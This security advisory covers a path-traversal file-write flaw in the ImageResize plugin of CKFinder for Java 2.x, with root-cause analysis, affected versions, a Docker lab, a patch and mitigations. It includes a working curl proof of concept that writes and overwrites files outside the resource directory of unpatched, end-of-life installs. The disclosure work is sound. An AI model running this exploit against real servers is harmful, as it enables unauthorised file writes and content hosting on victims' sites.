# CKFinder for Java 2.x — Path Traversal Write in the ImageResize Plugin

[![Affected](https://img.shields.io/badge/affected-2.0.2%20%E2%80%93%202.6.3-red)](#affected-versions)
[![CWE](https://img.shields.io/badge/CWE--22%20%7C%20CWE--73-orange)](#root-cause)
[![Vendor](https://img.shields.io/badge/vendor%20status-unfixed%20%2F%20EOL-lightgrey)](#disclosure-timeline)

**English** | [中文说明](#中文说明)

The `ImageResize` command of the `ImageResizePlugin` bundled with CKFinder for Java 2.x
validates the user-supplied output file name with an inverted boolean condition (`&&` where
`||` was intended) and then joins that name into a filesystem path without canonicalization.
A traversal name — invalid, but not hidden — passes the guard, so files can be written
outside the configured resource directory, including into publicly readable web directories.
On 2.5.1 and later, `overwrite=1` also replaces existing files.

| | |
|---|---|
| Product | CKFinder for Java (`ImageResizePlugin`) |
| Vendor | CKSource |
| Affected | CKFinder for Java 2.0.2 – 2.6.3 (all 20 downloadable 2.x releases) |
| Not affected | CKFinder 3.x / 4.x; CKFinder for PHP, ASP.NET, ColdFusion and Classic ASP |
| CWE | CWE-22, CWE-73 |
| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L` → **8.6** (unauthenticated, 2.5.1+)<br>`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` → 6.5 (2.0.2–2.5.0, no overwrite)<br>`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L` → 7.5 / 5.4 for authenticated deployments |
| Vendor status | Unfixed; 2.6.x reached end of life in November 2019 |
| Public status | No CVE, no vendor advisory, no public exploit (as of 2026-09) |

---

## Affected versions

The defect is present in **every Java 2.x release available from the vendor's download channel**.
All twenty were downloaded from `download.cksource.com` and audited:

| Version | Defective guard | Runtime-verified | Overwrite of existing files |
|---|---|---|---|
| 2.0.2, 2.0.2.1 | `&&` | 2.0.2 tested end to end | no — see below |
| 2.1, 2.1.1 | `&&` | 2.1 tested end to end | no |
| 2.2, 2.2.1, 2.2.2, 2.3 | `&&` | source-audited | no |
| 2.3.1 | `&&` | tested end to end | no |
| 2.4, 2.4.1, 2.4.2, 2.4.3 | `&&` | source-audited | no |
| 2.5.0 | `&&` | tested end to end | no |
| 2.5.1 | `&&` | tested end to end | yes |
| 2.6.0, 2.6.1 | `&&` | 2.6.0 tested end to end | yes |
| 2.6.2, 2.6.2.1, 2.6.3 | `&&` | all tested end to end | yes |
| 3.5.1 / 3.6.x / 4.x | n/a | rewritten | not applicable |

The twenty releases reduce to nine distinct versions of this file. The 2.6 line is the most
uniform: **2.6.0, 2.6.1, 2.6.2, 2.6.2.1 and 2.6.3 all carry a byte-identical copy**
(sha256 `6d30f2db787aa0f61b0b77287e73de714018c6814625bda6d2cb9dea564c0d4f`, 8,336 bytes) —
so the 2.6.3 "security release" did not touch it. Earlier releases differ only in unrelated
surrounding code; the broken guard is unchanged from 2.0.2 through 2.6.3. Per-version hashes for
every release are in [ADVISORY-hashes.md](ADVISORY-hashes.md).

### Overwrite capability depends on the release

From 2.0.2 to 2.5.0 the writability check reads:

```java
if (thumbFile.canWrite()) {                       // no exists() guard
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_ACCESS_DENIED;
}
```

`java.io.File.canWrite()` returns `true` for a path that does not exist, so on these releases
**writing a new file succeeds but overwriting any existing file fails** — inside the resource
directory as much as outside it. From 2.5.1 the check becomes
`if (thumbFile.exists() && !thumbFile.canWrite())` and overwriting works normally.

The consequence for impact: on 2.0.2–2.5.0 the primitive is arbitrary **create** (outside the
resource directory); on 2.5.1–2.6.3 it is arbitrary create **and replace**. The PoC detects which
behaviour a build exhibits rather than assuming one.

### Why only the Java connector

The other CKFinder 2.x platforms implement the same guard correctly, so their equivalent
`checkFileName` blocks `..` as intended:

| Platform | Version | Guard | Filename check rejects `..` |
|---|---|---|---|
| **Java** | 2.6.3 | **`&&`** | yes, but the guard never fires |
| PHP | 2.6.3 | `\|\|` | `strpos($fileName, "..")` |
| ASP.NET | 2.6.3 | `\|\|` | `fileName.Contains("..")` |
| ColdFusion | 2.6.3 | `or` | `find("..", fileName)` |
| Classic ASP | 2.6.3 | `or` | `inStr(fileName, "..")` |

The intended semantics are "reject if the name is invalid **or** hidden"; writing `&&` inverts the
guard into "reject only if invalid **and** hidden", which a traversal name never satisfies.
ASP.NET additionally rewrites interior dots (`\.(?![^.]*$)` → `_`) with a comment citing a
*"security issue"*, giving that platform a second layer the Java connector lacks.


The 2.6.3 release notes list two fixes:

> Version 2.6.3 — Security release: Fixed file upload vulnerability reported by Joshua Provoste:
> - Fixed logic responsible for uploading files without a file extension.
> - Added documentation that clarifies how to fully protect against content sniffing...

These correspond to [CVE-2019-15862](https://www.cve.org/CVERecord?id=CVE-2019-15862) and
CVE-2019-15891. Neither concerns the `ImageResize` plugin.

---

## Root cause

`ImageResizePlugin/src/main/java/com/ckfinder/connector/plugins/ImageResizeCommad.java`
(the filename uses the vendor's spelling, `Commad`).

```java
// Output file name validation
if (!FileUtils.checkFileName(this.newFileName)
    && FileUtils.checkIfFileIsHidden(this.newFileName, configuration)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_INVALID_NAME;
}

// Output path is joined without canonicalization
File thumbFile = new File(configuration.getTypes().get(this.type).getPath()
        + this.currentFolder, this.newFileName);
ImageUtils.createResizedImage(file, thumbFile, this.width, this.height,
        configuration.getImgQuality());
```

`FileUtils.checkFileName()` rejects any name containing `..`:

```java
public static boolean checkFileName(final String fileName) {
    return !(fileName == null || fileName.equals("")
        || fileName.charAt(fileName.length() - 1) == '.'
        || fileName.contains("..")
        || checkFolderNamePattern(fileName));
}
```

For a payload such as `xd/../../upload/login/poc.png`:

| Expression | Value |
|---|---|
| `FileUtils.checkFileName(payload)` | `false` (contains `..`) |
| `!FileUtils.checkFileName(payload)` | `true` |
| `FileUtils.checkIfFileIsHidden(payload, cfg)` | `false` (does not start with `.`) |
| `true && false` | `false` — guard not taken, request proceeds |

The guard rejects a name only when it is both invalid and hidden. Removing `checkFileName()` from
this path — or replacing `&&` with `||` — stops the traversal; the rest of the method is
unaffected. Measured before/after behaviour is in [Fix verification](#fix-verification).

### The stepping-stone directory

A name beginning with a dot (`../upload/x.png`) matches the default hidden-file pattern `.*`
and is rejected with `Error 102`. Prefixing an existing sub-directory (`xd/../../...`) keeps the
name from starting with a dot, so it passes the hidden-file check while `File` resolution still
normalizes the `..` segments out of the resource directory.

---

## Default authentication

`Configuration.checkAuthentication()` in the official jar returns `true` unconditionally:

```
$ javap -p -c -cp CKFinder-2.6.2.jar com.ckfinder.connector.configuration.Configuration
  public boolean checkAuthentication(javax.servlet.http.HttpServletRequest);
      Code:
         0: iconst_1
         1: ireturn

$ javap -p -constants -cp CKFinder-2.6.2.jar com.ckfinder.connector.configuration.IConfiguration
  public static final boolean DEFAULT_CHECKAUTHENTICATION = true;
```

`Command.checkConnector()` is `if (!configuration.enabled() || !configuration.checkAuthentication(request)) throw ...`.
Enabling the connector without overriding `checkAuthentication` therefore exposes it to anonymous
requests.

The bundled sample `WEB-INF/config.xml` ships with `<enabled>false</enabled>` and a warning:

> WARNING : DO NOT simply set "enabled" to "true" on a production site. ... You must implement
> some kind of session validation.

The sample supplies no implementation of that validation, and `checkAuthentication()` returns
`true` until one is provided. The one-setting path a deployer is most likely to take — flip
`enabled` and stop — produces an anonymous-accessible connector.

This affects who can reach the endpoint, not whether the defect exists. An authenticated
deployment still allows a low-privileged user to write outside the resource directory.

---

## Impact

An attacker able to reach the connector can:

1. Write files outside the configured resource directory, to any writable relative path,
   including directories served publicly by the web server;
2. Replace existing files with `overwrite=1`;
3. Host attacker-controlled content on the victim's origin, served under the victim's
   certificate and domain.

### Constraints

- Not directly RCE. The output extension must be on the resource type's allow-list; for the
  `Images` type this is `bmp,gif,jpeg,jpg,png`, and `.jsp` returns `Error 105`.
- The written bytes are a resampled image, or — when the requested dimensions equal the source
  image's dimensions — a byte-for-byte copy of the uploaded source, which preserves arbitrary
  data appended after the image payload.
- The source file must be readable as an image, since the command calls `ImageIO.read()` on it.
- On 2.0.2–2.5.0, existing files cannot be replaced (see [Overwrite capability](#overwrite-capability-depends-on-the-release)),
  so those releases allow creating new files outside the resource directory but not overwriting.

---

## Proof of concept

```bash
BASE='http://<target>'
EP="$BASE/ckfinder/core/connector/java/connector.java"
TOK='0123456789abcdef0123456789abcdef01234567'   # self-chosen; double-submit CSRF

# 1) Upload a source image -> {"fileName":"src.png",...}
curl -s -b "ckCsrfToken=$TOK" \
  -F "upload=@marker-1x1.png;type=image/png;filename=src.png" \
  -F "ckCsrfToken=$TOK" -F "CKFinderCommand=true" \
  "$EP?command=QuickUpload&type=Images&currentFolder=%2F&responseType=json"

# 2) Create the stepping-stone directory
curl -s -b "ckCsrfToken=$TOK" \
  --data-urlencode "command=CreateFolder" --data-urlencode "NewFolderName=xd" \
  --data-urlencode "type=Images" --data-urlencode "currentFolder=/" \
  --data-urlencode "ckCsrfToken=$TOK" --data-urlencode "CKFinderCommand=true" "$EP"

# 3) Traversal write; adjust the ../ depth to the target layout
curl -s -b "ckCsrfToken=$TOK" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "command=ImageResize" --data-urlencode "type=Images" \
  --data-urlencode "currentFolder=/" --data-urlencode "fileName=src.png" \
  --data-urlencode "newFileName=xd/../../../../upload/login/poc.png" \
  --data-urlencode "width=10" --data-urlencode "height=10" \
  --data-urlencode "overwrite=1" --data-urlencode "ckCsrfToken=$TOK" "$EP"
# -> Error 0
```

Two request-format details, neither a product defect: `CKFinderCommand=true` must be sent as a
form parameter for native commands, or `ConnectorServlet.checkPostRequest()` returns `Error 109`;
and the `../` depth depends on how `baseDir` is laid out.

The automated version, including negative controls and the fix check, is in
[`lab/poc/exploit.py`](lab/poc/exploit.py).

---

## Reproduce with Docker

The lab downloads the official 2.6.2 WAR at build time and verifies its SHA-256 against
`EXPECT_WAR_SHA256`; no vendor binary is redistributed here.

```bash
git clone https://github.com/H1Doujiang/ckfinder-imageresize-path-traversal.git
cd ckfinder-imageresize-path-traversal

docker build -t ckfinder-lab:2.6.2 ./lab
docker run -d --name ckfinder-lab -p 18080:8080 ckfinder-lab:2.6.2
docker exec -it ckfinder-lab /lab/poc/poc.sh
```

Stack: `ubuntu:22.04`, OpenJDK 8, Apache Tomcat 9.0.99. Tomcat 10+ uses `jakarta.servlet` and
cannot run CKFinder 2.6.x.

```
<webapp>/Resources/userfiles/         resource directory
<webapp>/Resources/userfiles/images/  "Images" type root
<webapp>/upload/login/                target outside the resource directory, anonymously readable
<tomcat>/webapps/shared/              second webapp, used for the cross-application case
```

---

## Verification results

Six cases, run against the unmodified official 2.6.2 WAR:

| # | Case | Result |
|---|---|---|
| T0 | Anonymous `Init` | `Error 0` |
| T1 | Traversal write into a publicly readable directory | `Error 0`; file lands outside the resource dir; anonymous `GET` → `200 image/png` |
| T2 | Cross-application write into another webapp's directory | `Error 0`; anonymously readable |
| T3 | Overwrite semantics | without `overwrite` → `115`, file unchanged; with `overwrite=1` → `Error 0`, original text content replaced by PNG |
| T4 | Byte-identical copy mode | output hash equals source hash (99 B, including appended trailing data) |
| T5 | Negative controls | dot-prefixed name → `102`; `.jsp` → `105`; missing source → `117`; legitimate in-directory output → `Error 0` |

T5 shows the check is present but incomplete: legitimate names are accepted and specific invalid
shapes are rejected, so the bypass is a logic error rather than an absent check.

### Fix verification

`lab/fix-verify/` compiles the patched command, swaps the class into the official plugin jar,
restarts Tomcat, and re-runs the same PoC:

| Case | Original | Patched |
|---|---|---|
| T1 traversal write | `Error 0`, file written | `Error 104`, nothing written |
| T2 cross-application write | `Error 0`, file written | `Error 104`, nothing written |
| T3 overwrite | content replaced | `Error 104`, file unchanged |
| T4 byte-identical copy | hash matched | `Error 104`, nothing written |
| T5 in-directory output | `Error 0`, file written | `Error 0`, file written (unchanged) |

---

## Remediation

### Code fix

```java
// 1) Do not run checkFileName() on newFileName. Its semantics are "a single file
//    name", but newFileName is a path relative to the type root, where ".." can be
//    legitimate (e.g. "sub/../out.png"). Replacing && with || rejects those too.
//    Keep only the hidden-file check here.
if (FileUtils.checkIfFileIsHidden(this.newFileName, configuration)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_INVALID_NAME;
}

// 2) Canonicalize and enforce the resource-directory boundary — this is the actual
//    security control, applied after ".." has been resolved.
File base = new File(configuration.getTypes().get(this.type).getPath()
        + this.currentFolder).getCanonicalFile();
File thumbFile = new File(base, this.newFileName).getCanonicalFile();
if (!(thumbFile.getPath() + File.separator).startsWith(base.getPath() + File.separator)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_ACCESS_DENIED;
}
```

Replacing `&&` with `||` alone also blocks the traversal, but it is over-broad: any name
containing `..` returns `Error 102`, including legitimate in-directory paths, and the `.jsp`
extension check is then never reached. `lab/fix-verify/` implements the version above, which
blocks all four traversal cases while leaving legitimate in-directory output working.

### Mitigation

1. Remove the `imageresize` plugin, or disable the `ImageResize` command.
2. Migrate to CKFinder 3.x / 4.x; the 2.6.x line will not be patched.
3. Override `checkAuthentication` and restrict `accessControls`, rather than granting all
   permissions to the wildcard role as the sample does.
4. Keep the resource directory outside the public web root where possible.

---

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-09-14 | Defect identified and reproduced in the lab |
| 2026-09-14 | This advisory published |
| 2026-09-14 | Vendor notified (`security@cksource.com`); 14-day review window |
| *pending* | CVE ID requested from MITRE |

---

## References

- CKFinder for Java 2.6.2 official distribution —
  `https://download.cksource.com/CKFinder/CKFinder%20for%20Java/2.6.2/ckfinder_java_2.6.2.zip`
- [CVE-2019-15862](https://www.cve.org/CVERecord?id=CVE-2019-15862) — extensionless file upload
- [CVE-2019-15891](https://www.cve.org/CVERecord?id=CVE-2019-15891) — content sniffing
- [CWE-22](https://cwe.mitre.org/data/definitions/22.html) ·
  [CWE-73](https://cwe.mitre.org/data/definitions/73.html)
- [CVE Program policy on end-of-life products](https://www.cve.org/Resources/Media/Archives/OldWebsite/cve/cna/CVE_Program_End_of_Life_EOL_Assignment_Process.html)

---

## 中文说明

### 缺陷

`ImageResizePlugin` 的 `ImageResize` 命令在输出文件名（`newFileName`）校验上写错了布尔运算符
（`&&` 应为 `||`），且拼接路径时未做规范化。`FileUtils.checkFileName()` 会拒绝含 `..` 的文件名，
但该守卫只在"既不合法又是隐藏文件"时才拒绝，而穿越名不合法却不隐藏，因此从未被拒绝。由此可写入
资源目录之外的任意可写相对路径，包括 Web 服务器公开可读的目录。

**CVSS 3.1**：未认证场景 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L` → **8.6**（2.5.1+）；
因 2.0.2–2.5.0 无法覆盖既有文件，完整性影响降为 `I:L` → 6.5。认证部署场景相应为 7.5 / 5.4。
分类：CWE-22、CWE-73。

**未直接达成 RCE**：输出扩展名须落在该 type 的白名单内，`Images` 类型只允许
`bmp,gif,jpeg,jpg,png`，写 `.jsp` 会被扩展名校验以 `Error 105` 拦下。

### 影响版本

**CKFinder for Java 2.0.2 – 2.6.3**，即官方下载渠道可获取的全部 20 个 2.x 版本，逐个审计后确认
均含该缺陷。20 个包归结为 9 个不同的缺陷文件版本；其中 **2.6.0 / 2.6.1 / 2.6.2 / 2.6.2.1 / 2.6.3
五版逐字节相同**（sha256 `6d30f2db…`，8,336 字节）——这就是 2.6.3 这个"安全修复版"对本缺陷毫无
作用的原因，其发布说明只涵盖无扩展名上传与内容嗅探两项。

下界为 2.0.2（官方渠道可取得的最早版本；2.0 / 2.0.1 返回 404）。各版本哈希见
[ADVISORY-hashes.md](ADVISORY-hashes.md)。

### 覆盖能力随版本变化

`canWrite()` 判定在 2.5.1 发生了变化：

- **2.0.2 – 2.5.0**：写作 `if (thumbFile.canWrite())`，缺少 `exists()` 前置判断。而
  `java.io.File.canWrite()` 对**不存在**的路径返回 `true`，于是写新目标成功、
  **覆盖任何既有文件都失败**（资源目录内外一致）。
- **2.5.1 – 2.6.3**：改为 `if (thumbFile.exists() && !thumbFile.canWrite())`，覆盖恢复正常。

即：前者是"任意新建"，后者是"任意新建 + 覆盖既有文件"。

### 为什么只有 Java 中招

同代的 PHP / ASP.NET / ColdFusion / Classic ASP 把同一处守卫写对了（`||` / `or`），
且各自的文件名校验都真的会拦 `..`，因此不受影响：

| 平台 | 门控 | 文件名校验拦 `..` |
|---|---|---|
| **Java 2.6.3** | **`&&`** | 会拦，但守卫永不触发 |
| PHP 2.6.3 | `\|\|` | `strpos($fileName, "..")` |
| ASP.NET 2.6.3 | `\|\|` | `fileName.Contains("..")` |
| ColdFusion 2.6.3 | `or` | `find("..", fileName)` |
| Classic ASP 2.6.3 | `or` | `inStr(fileName, "..")` |

ASP.NET 还额外做了点号替换（`\.(?![^.]*$)` → `_`，注释注明 *security issue*），
Java 没有这层防护。3.x / 4.x 的 `ImageResize` 已重构，输出名不由用户控制，同样不受影响。

### 认证模型

认证只决定谁能触发：`checkAuthentication()` 默认返回 `true`，而官方样例的 `<enabled>` 默认是
`false` 且附有警告，但不提供该函数的具体实现，部署方最省事的做法（只把 `enabled` 改成 `true`）
即产生匿名可访问的连接器。缺陷本体在 `ImageResizeCommad` 内部——代码已判定文件名非法却未拒绝。

### 修复建议

1. **不要**对 `newFileName` 套用 `checkFileName()`，只保留隐藏文件检查。
   它的语义是"单个文件名"，而 `newFileName` 是相对路径，合法值本来就可能含 `..`（如
   `sub/../out.png`）；简单把 `&&` 改成 `||` 会连合法路径一起拒掉（`Error 102`），
   并短路掉扩展名校验。
2. 输出路径 `getCanonicalFile()` 并校验前缀仍在资源目录内——这才是真正的安全边界。
3. 部署方：移除 `imageresize` 插件、覆写 `checkAuthentication`、收紧 ACL，或迁移到 3.x / 4.x。

补丁代码与实测结果见英文部分的 [Remediation](#remediation) 与
[Fix verification](#fix-verification)。完整加固版源码在
[`lab/fix-verify/ImageResizeCommad-patched.java`](lab/fix-verify/ImageResizeCommad-patched.java)。

复现步骤见英文部分的 [Reproduce with Docker](#reproduce-with-docker)。

---

## License

The advisory text, PoC scripts and lab files in this repository are released under the
[MIT License](LICENSE). CKFinder is commercial software by CKSource and is not redistributed
here; the lab downloads it from the vendor's official channel and verifies its hash.
